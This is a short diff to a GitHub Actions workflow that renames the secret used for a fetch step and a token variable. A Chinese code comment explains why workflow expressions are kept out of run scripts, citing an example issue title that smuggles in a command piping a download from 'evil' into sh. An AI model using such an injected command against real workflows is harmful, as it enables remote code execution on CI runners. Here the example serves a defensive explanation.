@@ -45,7 +45,7 @@ jobs:
       # `-c credential.helper=` 一次性传凭据的，token 不落盘。
       - name: Fetch executor
         env:
-          GH_TOKEN: ${{ secrets.STORE_WRITE_TOKEN }}
+          GH_TOKEN: ${{ secrets.GH_PAT }}
         run: |
           set -euo pipefail
           echo "::add-mask::$GH_TOKEN"
@@ -58,7 +58,7 @@ jobs:
           # 一切外部数据只经 env 传入；run: 里是固定脚本文本（禁止 ${{ }} 插值）。
           # 这一条与 store 侧 forward.yml 是同一个理由：`${{ }}` 在 run: 里是
           # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
-          STORE_TOKEN: ${{ secrets.STORE_WRITE_TOKEN }}
+          STORE_TOKEN: ${{ secrets.GH_PAT }}
           EVENT: ${{ github.event.client_payload.event || github.event_name }}
           ISSUE: ${{ github.event.client_payload.issue }}
           RELEASE_TAG: ${{ github.event.client_payload.releaseTag }}
